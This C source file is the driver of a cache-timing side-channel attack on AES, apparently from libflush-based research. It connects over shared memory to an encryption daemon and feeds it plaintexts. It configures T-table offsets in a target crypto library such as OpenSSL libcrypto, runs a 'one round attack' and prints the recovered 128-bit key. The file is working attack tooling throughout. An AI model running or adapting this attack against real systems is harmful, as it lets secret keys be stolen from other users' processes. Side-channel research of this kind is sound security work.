#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "shmdefs.h"
#include "one_round.h"


static struct one_round_attack_ctx attack_ctx;

static int ipc_fd;
static void *addr;
static struct shm_msg *client_msg;
static struct shm_msg *server_msg;


static int connect() {	
	/* SHM Open */
    if((ipc_fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
        perror("SHM open error");
        return -1;
    }
	
	/* Mmap */
    addr = mmap(NULL, MAXSZ, PROT_READ | PROT_WRITE, MAP_SHARED, ipc_fd, 0);
    if(addr == MAP_FAILED) {
        perror("Mmap error");
	    
        // Close SHM
        if(munmap(addr, MAXSZ) == -1) {
            perror("Munmap error");
    	}
        
        // Close file desc
        if(close(ipc_fd) == -1) {
            perror("IPC close error");
        }

	    return -1;

    }
	
	client_msg = (struct shm_msg *)((char*)addr + CID);
    server_msg = (struct shm_msg *)((char*)addr + SID);
	
	return 0;
}

static int encrypt_msg(unsigned char *in, unsigned char *out, int size) {
	// Prepare message
	client_msg->status = 0;
	client_msg->len = size;
	
	// Send message
	memcpy(client_msg->msg, in, client_msg->len);
	client_msg->status = 1;
	
	// Read reply from server
	while(1) {
		if(server_msg->status == 1) {	
			memcpy(out, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
		sleep(0);
	}
	
	return 0;
}

static void disconnect() {
	// Send end message
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG) + AES128_KEY_LEN;
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	memcpy(client_msg->msg + sizeof(END_MSG), attack_ctx.result.predict_key, AES128_KEY_LEN);
	client_msg->status = 1;
	
	// Close SHM
	if(munmap(addr, MAXSZ) == -1) {
		perror("Munmap error");
	}

    // Close file descriptor
	if(close(ipc_fd) == -1) {
		perror("Close error");
	}
}

// Convert string to hexadecimal
static void string_to_hex(unsigned char *pIn, unsigned int pInLen, unsigned char *pOut)
{
    unsigned int i, j;
    unsigned int mul;
    char data = 0;

    for(i=0, j=0; i<pInLen; i++) {
        if(i % 2 == 0)
            mul = 16;
        else
            mul = 1;

        if (pIn[i] >= '0' && pIn[i] <= '9')
            data += ((pIn[i] - 48) * mul);
        else if (pIn[i] >= 'a' && pIn[i] <= 'f')
            data += ((pIn[i] - 87) * mul);
        else if (pIn[i] >= 'A' && pIn[i] <= 'F')
            data += ((pIn[i] - 55) * mul);
        else
            return;

        if(mul == 1)
        {
            pOut[j] = data;
            data = 0;
            j++;
        }
    }
}

// Convert hex string to int
static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut) {
    // Hex string must be big indian
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char *) &test;

    if(ptr[0] == 0x01) {
        is_little_endian = 1;
    }

    if(pInLen != sizeof(unsigned int) * 2) {
        return;
    }

    string_to_hex((unsigned char*)pIn, pInLen, (unsigned char*)pOut);
    
    if(is_little_endian) {
        char tmp;
        unsigned int i, j;
        ptr = (char *) pOut;
        for (i = 0, j = sizeof(unsigned) - 1; i < sizeof(unsigned); i++, j--) {
            if (i > j) {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

static void set_one_round_attack_args(char **argv) {
	struct one_round_attack_args *args = &attack_ctx.args;
	
	// Set args
	args->plain_text_cnt = atoi(argv[1]);
	args->cache_attack_repeat_cnt = atoi(argv[2]);
	args->cpu_cycle_threshold = atoi(argv[3]);
	hex_string_to_int((unsigned char *)argv[4], strlen(argv[4]), &args->off_te0);
	hex_string_to_int((unsigned char *)argv[5], strlen(argv[5]), &args->off_te1);
	hex_string_to_int((unsigned char *)argv[6], strlen(argv[6]), &args->off_te2);
	hex_string_to_int((unsigned char *)argv[7], strlen(argv[7]), &args->off_te3);

    // Set cache line size.
	args->cache_line_size = 64;
	sprintf(args->crypto_lib, "%s", argv[8]);
	sprintf(args->plaintext_file, "%s", "/home/sivasama/libflush/test-suite/aes/plain.txt");
	
	// Set callback function
	attack_ctx.encrypt = encrypt_msg;
}

int main(int argc, char **argv)
{
	int i, r;
	
	if (argc != 9) {
		printf("[attacker]: Usage => ./attacker <limit plain text count> <repeat count for a plaintext> <cpu cycle threshold> <offset te0> <offset te1> <offset te2> <offset te3> <crypto library path>\n");	
        printf("[attacker]: Example => ./attacker 1000 1 200 0010dca8 0010e0a8 0010e4a8 0010d8a8 /usr/lib/libcrypto.so.1.0.0\n");
		return 0;
	}
	
	// Connect daemon
	r = connect();
	if (r) {
		perror("[attacker]: daemon connect error");
		return 0;
    }
	printf("[attacker]: daemon connect success\n");
	
	// Set one_round_attack args 
	set_one_round_attack_args(argv);
	
	// Initialize one_round_attack ctx 
	r = one_round_attack_init(&attack_ctx);
	if (r) {
		perror("[attacker]: One round attack init failed");
		return 0;
	}
	
	// Perform one round attack
	one_round_attack_do_attack(&attack_ctx);
	
	// Print result
	printf("[attacker]: predicted key => ");
	for (i = 0; i < 16; i++)
		printf("%02x", attack_ctx.result.predict_key[i]);
	printf("\n");
	
	// Finalize
	one_round_attack_finalize(&attack_ctx);

    // Disconnect daemon.
    disconnect();
	
	return 0;
}
